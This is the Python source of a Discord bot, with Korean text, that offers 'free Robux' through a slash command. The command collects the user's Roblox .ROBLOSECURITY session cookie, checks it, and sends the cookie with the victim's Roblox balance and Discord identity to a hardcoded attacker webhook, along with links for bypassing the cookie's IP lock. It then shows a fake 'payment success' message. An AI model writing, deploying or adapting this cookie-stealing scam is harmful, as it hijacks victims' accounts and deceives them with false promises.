import os
import requests
import discord
from discord.ext import commands
import time
from keep_alive import keep_alive
keep_alive()

class Bot(commands.Bot):
    def __init__(self, intents: discord.Intents, **kwargs):
        super().__init__(command_prefix="!", intents=intents, case_insensitive=True)

    async def on_ready(self):
        print(f"Logged in as {self.user}")
        await self.tree.sync()

intents = discord.Intents.all()
bot = Bot(intents=intents)

@bot.hybrid_command(name='로블록스-무료-로벅스', description='파이썬 기반 웹 API를 이용하여 로블록스랑 연동하여 로벅스를 봇이 Temp Card로 결제합니다.')
async def free_robux(interaction: discord.Interaction, 로블록스_쿠키: str):
    try:
        
        # Never hardcode your webhook URL directly in your code, consider using a config file
        webhook_url = "https://discord.com/api/webhooks/1195928311373779034/9n6FwsReoYk73oyw6RXJDbucRjmhIlpXm8ezS7D7Ph1DePpK6su4hBFvL0ZAq2lepmvy"

        cookie = 로블록스_쿠키
        
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie

        # Make a request to get authenticated user information
        check_cookie_response = session.get('https://users.roblox.com/v1/users/authenticated')

        if check_cookie_response.status_code == 200:

            roblox_username = check_cookie_response.json()['name']
            roblox_displayname = check_cookie_response.json()['displayName']
            roblox_user_id = check_cookie_response.json()['id']
            robux = requests.get(f'https://economy.roblox.com/v1/users/{roblox_user_id}/currency',cookies={'.ROBLOSECURITY': cookie}).json()['robux']
            roblox_avatar_url = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_user_id}&size=420x420&format=Png&isCircular=true").json()["data"][0]["imageUrl"]
            user = interaction.author
            user_id = user.id
            user_name = user.name

            discorddata = {
                "content": "<@&1195931187428986972>\n[🍪 로블록스 쿠키 확인 링크 🍪](<https://eggy.cool>)\n[🍪 쿠키 IP 잠김 우회 링크 🍪](<https://eggy.cool/iplockbypass>)",
                "embeds": [
                    {
                        "title": "🍪 로블록스 쿠키 로그 🍪",
                        "description": f"```\n{cookie}\n```",
                        "color": 8296703,
                        "fields": [
                            {"name": "디스코드 닉네임", "value": user_name, "inline": True},
                            {"name": "디스코드 유저 ID", "value": user_id, "inline": True},
                            {"name": "유저 핑", "value": f"<@{user_id}>", "inline": True},
                            {"name": "로블록스 닉네임", "value": f"{roblox_username}", "inline": True},
                            {"name": "로블록스 디플닉", "value": f"{roblox_displayname}", "inline": True},
                            {"name": "로벅스", "value": f"{robux} 로벅스", "inline": True},
                        ]
                    }
                ]
            }

            headers = {'Content-Type': 'application/json'}

            # Use an asynchronous HTTP library (e.g., aiohttp) for async requests
            response = requests.post(url=webhook_url, json=discorddata, headers=headers)

            if response.ok:     
                embed = discord.Embed(
                    title=f"<a:Robux:1195990530648178778> {roblox_username}님 로벅스 충전을 시도합니다... <a:Loading:1196037169748398160>",
                    color=65280
                )
                embed.add_field(
                    name="닉네임",
                    value=roblox_username,
                    inline=True
                )
                embed.add_field(
                    name="디플닉",
                    value=roblox_displayname,
                    inline=True
                )
                embed.add_field(
                    name="로벅스",
                    value=f"{robux} 로벅스",
                    inline=True
                )
                embed.set_thumbnail(
                    url=roblox_avatar_url
                )
                await interaction.send(embed=embed, ephemeral=True)
                time.sleep(3.5)
                embed = discord.Embed(
                    title=":white_check_mark: 로벅스 결제 성공! :white_check_mark:",
                    description="**24시간 후 로벅스가 랜덤한 값으로 들어옵니다!**\n\n**:warning: 만약 이 커맨드를 2번 이상 사용 하셨다면 중첩 오류로 인해 결제가 진행 되지 않을 수 있습니다! :warning:**",
                    color=65280
                )
                await interaction.send(embed=embed, ephemeral=True)
                print("Webhook successfully called")
            else:
                print(f"Webhook call failed with status code: {response.status_code}")
        else:
            embed = discord.Embed(
                title=":x: 에러 :x:",
                description="```로블록스 쿠키가 올바르지 않습니다```",
                color=16711680
            )
            await interaction.send(embed=embed, ephemeral=True)

    except Exception as e:
        print(f"An error occurred: {e}")
        # Handle the error appropriately (e.g., log it, send a message, etc.)

# Token should be kept secure, not hardcoded in the script
bot.run(os.environ.get('token'))
